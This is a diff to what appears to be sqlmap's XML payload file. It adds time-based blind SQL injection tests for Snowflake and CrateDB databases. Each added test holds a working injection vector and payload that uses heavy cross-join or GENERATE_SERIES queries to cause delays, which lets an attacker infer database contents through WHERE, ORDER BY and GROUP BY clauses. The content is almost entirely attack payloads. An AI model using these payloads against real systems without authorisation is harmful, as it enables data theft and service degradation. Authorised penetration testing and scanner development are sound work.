@@ -2170,5 +2170,103 @@
         </details>
     </test>
 
+    <!-- Snowflake time-based payloads -->
+    <test>
+        <title>Snowflake AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A,INFORMATION_SCHEMA.COLUMNS B,INFORMATION_SCHEMA.COLUMNS C WHERE [RANDNUM]=[RANDNUM]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A,INFORMATION_SCHEMA.COLUMNS B,INFORMATION_SCHEMA.COLUMNS C WHERE [RANDNUM]=[RANDNUM])>[RANDNUM1]</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Snowflake OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A,INFORMATION_SCHEMA.COLUMNS B,INFORMATION_SCHEMA.COLUMNS C WHERE [RANDNUM]=[RANDNUM]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A,INFORMATION_SCHEMA.COLUMNS B,INFORMATION_SCHEMA.COLUMNS C WHERE [RANDNUM]=[RANDNUM])>[RANDNUM1]</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <!-- CrateDB time-based payloads -->
+    <test>
+        <title>CrateDB AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]00000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]00000000))>[RANDNUM1]</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>CrateDB OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]00000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]00000000))>[RANDNUM1]</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
+    <!-- Snowflake time-based ORDER BY, GROUP BY -->
+    <test>
+        <title>Snowflake time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A,INFORMATION_SCHEMA.COLUMNS B,INFORMATION_SCHEMA.COLUMNS C WHERE [RANDNUM]=[RANDNUM]) ELSE [RANDNUM] END))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A,INFORMATION_SCHEMA.COLUMNS B,INFORMATION_SCHEMA.COLUMNS C WHERE [RANDNUM]=[RANDNUM]) ELSE [RANDNUM] END))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
     <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->
 </root>
